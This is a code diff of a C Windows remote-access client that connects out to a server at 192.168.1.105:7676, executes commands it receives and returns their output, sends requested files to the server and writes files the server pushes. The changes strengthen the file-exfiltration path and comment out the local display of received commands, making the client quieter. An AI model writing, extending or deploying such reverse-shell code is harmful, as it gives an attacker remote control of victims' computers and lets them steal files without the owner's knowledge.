@@ -13,7 +13,7 @@ void messageHandler(SOCKET connectSocket);
 
 int main()
 {
-    SOCKET connectSocket = connectServer("192.168.8.128", "7676");
+    SOCKET connectSocket = connectServer("192.168.1.105", "7676");
     if (connectSocket != INVALID_SOCKET) {
         messageHandler(connectSocket);
     }
@@ -86,7 +86,7 @@ void messageHandler(SOCKET connectSocket) {
             while (received < expectedSize) {
                 received += recv(connectSocket, (char*)(cmdBuffer) + received, expectedSize - received, 0);
             }
-            wprintf(L"Command received: %ls\n", cmdBuffer);
+            //wprintf(L"Command: %ls\n", cmdBuffer);
 
             // RUNCMD and save output
             // Prepare full cmd to execute
@@ -130,7 +130,7 @@ void messageHandler(SOCKET connectSocket) {
                 send(connectSocket, finalResult, totalResultSize, 0);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
-                if (finalResult) free(finalResult);
+                free(finalResult);
             }
 
             CloseHandle(hRead);
@@ -139,7 +139,7 @@ void messageHandler(SOCKET connectSocket) {
             break;
         }
         case DOWNLOAD: {
-            char* fileName = (char*)calloc(1, expectedSize+1);
+            char* fileName = (char*)malloc(expectedSize);
             int recieved = 0;
             unsigned int fileSize = 0;
             LARGE_INTEGER largeInt;
@@ -149,17 +149,27 @@ void messageHandler(SOCKET connectSocket) {
             }
             // Get file size and read file bytes into a buffer
             HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-            GetFileSizeEx(hFile, &largeInt);
-            fileSize = (unsigned int)largeInt.QuadPart;
-            char* fileBuffer = (char*)malloc(fileSize);
-            ReadFile(hFile, fileBuffer, fileSize, NULL, NULL);
-            //send to server 4b size + data
-            send(connectSocket, (char*)&fileSize, sizeof(int), 0);
-            send(connectSocket, fileBuffer, fileSize, 0);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                GetFileSizeEx(hFile, &largeInt);
+                fileSize = (unsigned int)largeInt.QuadPart;
+                char* fileBuffer = (char*)malloc(fileSize);
+                ReadFile(hFile, fileBuffer, fileSize, NULL, NULL);
+                //send to server 4b size + data
+                send(connectSocket, (char*)&fileSize, sizeof(int), 0);
+                send(connectSocket, fileBuffer, fileSize, 0);
+                free(fileBuffer);
+            }//if create file failed, the file will contain error info
+            else {
+                char msg[50];
+                sprintf_s(msg, "Failed to open file on client\nError: %d", GetLastError());
+                int msgLen = strlen(msg) + 1;
+                send(connectSocket, (char*)&msgLen, sizeof(int), 0);
+                send(connectSocket, msg, msgLen, 0);
+            }
 
             CloseHandle(hFile);
             free(fileName);
-            free(fileBuffer);
+            
             break;
         }
         case UPLOAD: {
@@ -190,8 +200,7 @@ void messageHandler(SOCKET connectSocket) {
             n = 0;
             while (n < fileSize)
                 n += recv(connectSocket, fileBuffer + n, fileSize - n, 0);
-            //CreateFile
-            //printf("%s\n", uploadPath);
+            //CreateFile and WriteFile
             hFile = CreateFileA(uploadPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
             if (hFile != INVALID_HANDLE_VALUE) {
                 if (WriteFile(hFile, fileBuffer, fileSize, NULL, NULL)) {
@@ -199,12 +208,12 @@ void messageHandler(SOCKET connectSocket) {
                     send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                     send(connectSocket, (char*)&result, sizeof(int), 0);
                 } else {
-                    //printf("%d", GetLastError());
+                    result = GetLastError();
                     send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                     send(connectSocket, (char*)&result, sizeof(int), 0);
                 }
             } else {
-                //printf("%d", GetLastError());
+                result = GetLastError();
                 send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                 send(connectSocket, (char*)&result, sizeof(int), 0);
             }
